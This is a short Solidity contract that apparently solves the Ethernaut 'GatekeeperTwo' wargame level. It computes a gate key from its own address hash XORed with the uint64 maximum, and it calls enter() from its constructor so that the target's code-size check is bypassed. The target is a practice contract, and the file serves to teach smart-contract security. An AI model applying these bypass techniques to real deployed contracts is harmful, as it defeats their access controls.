// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "./GatekeeperTwo.sol";
import "forge-std/console.sol";

contract GatekeeperTwoHack {
    constructor(address instance) {
        uint64 key = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ (type(uint64).max); // ^ = XOR
        console.log(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(key))
        );
        console.log(type(uint64).max);
        bool result = GatekeeperTwo(instance).enter(bytes8(key));
        require(result, "failed");
    }
}
